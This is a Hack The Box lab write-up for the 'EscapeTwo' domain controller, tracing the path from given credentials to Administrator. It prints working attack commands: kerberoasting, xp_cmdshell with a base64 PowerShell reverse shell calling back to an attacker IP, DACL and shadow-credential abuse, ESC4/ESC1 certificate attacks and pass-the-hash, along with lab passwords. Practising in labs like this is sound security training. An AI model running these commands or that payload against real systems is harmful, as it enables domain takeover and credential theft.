---
title: EscapeTwo
draft: false
password: jiji
tags:
---

# Enumeration

> [!INFO]
> HTB provides us with some valid credentials `rose / KxEPkKe6R8su`

* As in all penetration test, we start with a [[[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]] scan

````bash
nmap -p- -sS -n -Pn --min-rate 5000 -open 10.10.11.51 -oG allPorts
````

> [!info]- Result
> ![Pasted image 20250216204247.png](Pasted%20image%2020250216204247.png)

* Now we now that the target machine is a windows enviroment, lets preforme some version scan and use some commons scripts against this ports

````bash
sudo nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49691,49706,49722,49743,49810 -sCV --min-rate 5000 -n -Pn -open 10.10.11.51 -oN Targeted
````


>[!info]- Result
>![Pasted image 20250216205045.png](Pasted%20image%2020250216205045.png) 
>![Pasted image 20250216205113.png](Pasted%20image%2020250216205113.png)

* So we have this information to be highlighted
  * we are in front of a Domain controller (DC01.sequel.htb)
  * DC is using kerberos to authentication
  * there are a ldap service
  * it have a ms-sql service
  * it have AD

## LDAP Enumeration

* We can try to enumerate LDAP protocol, using the given creds

````bash
ldapsearch -x -H ldap://10.10.11.51 -D 'sequel\rose' -w 'KxEPkKe6R8su' -b "DC=sequel,DC=htb"

or (faster)

ldapdomaindump 10.10.11.51 -u 'sequel\rose' -p 'KxEPkKe6R8su' --authtype SIMPLE 
````

>[!info]- Result
>![Pasted image 20250217010219.png](../../../../assets/Pasted%20image%2020250217010219.png)

## kerberos

* after looking all directories, i didnt found no thing, so lets preform a `kerberoasting` attack with [nxc](tools/nxc.md)

````bash
netexec ldap 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --kerberoast kerb.txt
````

![Pasted image 20250217020128.png](../../../../assets/Pasted%20image%2020250217020128.png)

* after trying crack him, they do not crack...

````bash
john kerb.txt --wordlist=/usr/share/wordlists/rockyou.txt
````

![Pasted image 20250219190902.png](../../../../assets/Pasted%20image%2020250219190902.png)

## Bloodhaund enumeration

* we can use [bloodhaund-python](tools/bloodhaund-python.md) to perform a collection of data

````bash
bloodhound-python -d sequel.htb -u rose -p KxEPkKe6R8su -c ALL -ns 10.10.11.51
````

* And then import it to [BloodHound](../../../Tools/BloodHound.md), and we can see that there are only a user with admin rights
  ![Pasted image 20250219192824.png](../../../../assets/Pasted%20image%2020250219192824.png)

There are 8 domain users
![Pasted image 20250219195347.png](../../../../assets/Pasted%20image%2020250219195347.png)

* the users: `sql_svc` and `ca_svc` looks so good
  ![Pasted image 20250219200216.png](../../../../assets/Pasted%20image%2020250219200216.png)
  he can access to the sql data base
  ![Pasted image 20250219200455.png](../../../../assets/Pasted%20image%2020250219200455.png)
  with this user we can issue certs, so lets use certipy-ad to enumerate CA

## certipy-ad enumeration

* we can twerk certipy to enumerate data in [BloodHound](../../../Tools/BloodHound.md) format (and then we can import it)

````bash
certipy find -bloodhound -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u rose@sequel.htb -p 'KxEPkKe6R8su'
````

 
 > [!warning]- In my case, i couldn't import it :(
 > ````bash
 > certipy find -stdout -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u rose@sequel.htb -p 'KxEPkKe6R8su
 > ````


* lets read the result, but own user dont have access
  ![Pasted image 20250219202033.png](../../../../assets/Pasted%20image%2020250219202033.png)

## SMB Enumeration

* lets continue with the enumeration, now, smb:

````bash
nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares

or

impacket-smbclient sequel/rose:KxEPkKe6R8su@10.10.11.51
````

 
 > [!info]- Result
 > ![Pasted image 20250217010750.png](../../../../assets/Pasted%20image%2020250217010750.png)

* we have read permission over "accounting department", lets download the content
  ![Pasted image 20250219202706.png](../../../../assets/Pasted%20image%2020250219202706.png)
* if we try to open with LibreOffice, the documents are corrupted
  ![Pasted image 20250219203051.png](../../../../assets/Pasted%20image%2020250219203051.png)
* but xlsx files are archives that contains spreadsheets so we can unzip him and check

````bash
unzip accouns.xlsx
libreoffice xl/sharedStrings.xml
````

![Pasted image 20250219203902.png](../../../../assets/Pasted%20image%2020250219203902.png)

* BOOM! we have some password, we can use https://jumpshare.com/viewer/xlsx to better readability

|First Name|Last Name|Email|Username|Password|
|----------|---------|-----|--------|--------|
|Angela|Martin|angela@sequel.htb|angela|0fwz7Q4mSpurIt99|
|Oscar|Martinez|oscar@sequel.htb|oscar|86LxLBMgEWaKUnBG|
|Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo|
|NULL|NULL|sa@sequel.htb|sa|MSSQLP@ssw0rd!|

 > [!note] we can use this password in john to crack the tickets but they didnt work

# Foothold

## Enumerating as `ca`

* the most important user here is `sa` because is the admin user of `mssql`, so lets try to login as `ac` firts (if we dont find nothing we can try the other users)

````bash
mssqlclient.py sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
````

* now we have to enable `xp_cmdshell`

````mssql
enable_xp_cmdshell
RECONFIGURE
````

![Pasted image 20250220115526.png](../../../../assets/Pasted%20image%2020250220115526.png)

* we can try to get a revershell with a payload (https://www.revshells.com/), first start the listener

````bash
rlwrap -cAr nc -nlvp 4444
````

* then send the payload


 > [!note]- Payload
 > 
 > ````mssql
 > xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADMAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
 > ````

![Pasted image 20250220120007.png](../../../../assets/Pasted%20image%2020250220120007.png)

* perfect now the have access to the system, lets enumerate some interesting resources
  ![Pasted image 20250220122514.png](../../../../assets/Pasted%20image%2020250220122514.png)
* Perfect!, now we have an other password `WqSZAF6CysDQbGb3`, lets tests this password to the users that we dont have password yet

````bash
nxc smb 10.10.11.51 -u ./users -p ./passwords -k --continue-on-success | grep -e "[+]"
````

![Pasted image 20250220123855.png](../../../../assets/Pasted%20image%2020250220123855.png)

# Lateral Movement

* we can connect to ryan using [evil-winrm](tools/evil-winrm.md)

````bash
evil-winrm --ip 10.10.11.51 --user ryan --password WqSZAF6CysDQbGb3
````

* get the user flag
  ![Pasted image 20250220124847.png](../../../../assets/Pasted%20image%2020250220124847.png)

# Privilege Escalation

* if we check [BloodHound](../../../Tools/BloodHound.md) we can see that ryan has (as first degree object control) writeOwner over `CA_SVC` user
  ![Pasted image 20250220125521.png](../../../../assets/Pasted%20image%2020250220125521.png)

If we have WriteOwner over a:

* User:
  
  * We can assign all rights to another account which will allow us to perform a Password Reset via a Force Change Password Attack, Targeted Kerberoasting Attack or a Shadow Credentials Attack.
    * I would like to perform a targeted Kerberoasting Attack or Shadow Credentials attack, mainly as I do not like changing users passwords if I don’t have to.
* Group:
  
  * We can add or remove members after we grant the new owner (which we control full privileges)
* GPO:
  
  * We can modify it.
  * GPO Attacks as well other DACL abuses (such as computer attacks).
* that's means that we hace control over a privileged user
  ![Pasted image 20250220125733.png](../../../../assets/Pasted%20image%2020250220125733.png)

* first we have to get the `ca_svc` hash using kerberoasting technique using [targetedKerberoast.py](tools/targetedKerberoast.py.md)

````bash
python3 targetedKerberoast.py -v -d sequel.htb -u rose -p KxEPkKe6R8su --request-user ca_svc -o ca_svc.kerb
````

![Pasted image 20250220135034.png](../../../../assets/Pasted%20image%2020250220135034.png)
 > but we cant brute force him

* modify the ownership over `ca_svc` using [owneredit.py](tools/owneredit.py.md)

````bash
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
````

![Pasted image 20250220135700.png](../../../../assets/Pasted%20image%2020250220135700.png)


 > [!warning] You have to try it some times, because the first time i have run the script, the user was not the correct

* now we can grant ryan full privileges over `ca_svc` using [dacledit.py](tools/dacledit.py.md)

````bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
````

![Pasted image 20250220133230.png](../../../../assets/Pasted%20image%2020250220133230.png)

* Using [pywhisker.py](tools/pywhisker.py.md)

````bash
python3 pywhisker.py -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --target "CA_SVC" --action "add" --filename CACert --export PEM
````

![Pasted image 20250220140456.png](../../../../assets/Pasted%20image%2020250220140456.png)
![Pasted image 20250220141515.png](../../../../assets/Pasted%20image%2020250220141515.png)

* We can have full control over `ac_svc` so lets request a TGT for this user, using [gettgtpkinit.py](tools/gettgtpkinit.py.md)

````bash
python3 ../../PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
````

![Pasted image 20250220151614.png](../../../../assets/Pasted%20image%2020250220151614.png)


 > [!info] save this key for the next step `2c9b71a0695508a8e51[snip]6eb5db62ddbc86b1a`

* Perfect now we can use this file `.cache` to get the NTLM hash of the user
  ![Pasted image 20250220150514.png](../../../../assets/Pasted%20image%2020250220150514.png)


 > [!Warning]- We need to set this variable `KRB5CCNAME` with this value `/path/to/ca_svc.ccache`
 > 
 > ````bash
 > export KRB5CCNAME=./ca_svc.ccache
 > ````

* Extracting NTLM hash with [getnthash.py](tools/getnthash.py.md)

````bash
python3 ../../PKINITtools/getnthash.py -key 2c9b71a0695508a8e51[snip]62ddbc86b1a sequel.htb/ca_svc
````

![Pasted image 20250220151855.png](../../../../assets/Pasted%20image%2020250220151855.png)

* So we got the NT hash we can use it to pass-the-hash of the user `ca_svc`

````bash
nxc smb 10.10.11.51 -u 'ca_svc' -H '3b181b91[snip]bc2b7fce' -k --continue-on-success | grep -e "[+]"
````

![Pasted image 20250220152234.png](../../../../assets/Pasted%20image%2020250220152234.png)

* Nice! NT hash works perfectly, we can run [certify](tools/certify.md) again but with this credentials

````bash
certipy find -stdout -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u ca_svc@sequel.htb -hashes :'3b181b914e7[snip]c2b7fce'
````

![Pasted image 20250220152818.png](../../../../assets/Pasted%20image%2020250220152818.png)

* this cert is vulnerable to the [EZC4 attack vector](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4) (As we are part of `cert publisher` group we can attack)
  ![Pasted image 20250220153000.png](../../../../assets/Pasted%20image%2020250220153000.png)

* lest perform the attack,

````bash
certipy template -username ca_svc@sequel.htb -hashes :'3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -save-old
````

![Pasted image 20250220153352.png](../../../../assets/Pasted%20image%2020250220153352.png)

* Now the certificate is vulnerable to [ESC1 attack vector](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1)

````bash
certipy req -username ca_svc@sequel.htb -hashes :'3b181b914e7[snip]1e20bc2b7fce' -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51
````

![Pasted image 20250220154109.png](../../../../assets/Pasted%20image%2020250220154109.png)


 >[!error]- you have to run ESC1 instantly after ESC4, if u run this command like 10-15s later u will the a DNS crash, like this
 > ![Pasted image 20250220154424.png](../../../../assets/Pasted%20image%2020250220154424.png)
 > do:
 > ![Pasted image 20250220154551.png](../../../../assets/Pasted%20image%2020250220154551.png)

* perfect now we have a certificate to authenticate Administrator into DC, we can use [certify](tools/certify.md) to get the NTLM hash of this user

````bash
certipy auth -pfx administrator.pfx -domain sequel.htb
````

![Pasted image 20250220154841.png](../../../../assets/Pasted%20image%2020250220154841.png)

* lets perform a pass-the-hash attack

````bash
evil-winrm --ip 10.10.11.51 -u Administrator -H '7a8d4e[snip]60f75e5a0b3ff'
````

![Pasted image 20250220155628.png](../../../../assets/Pasted%20image%2020250220155628.png)

* Now we are admin:
  ![Pasted image 20250220160118.png](../../../../assets/Pasted%20image%2020250220160118.png)



Root:MyLittlePony69!
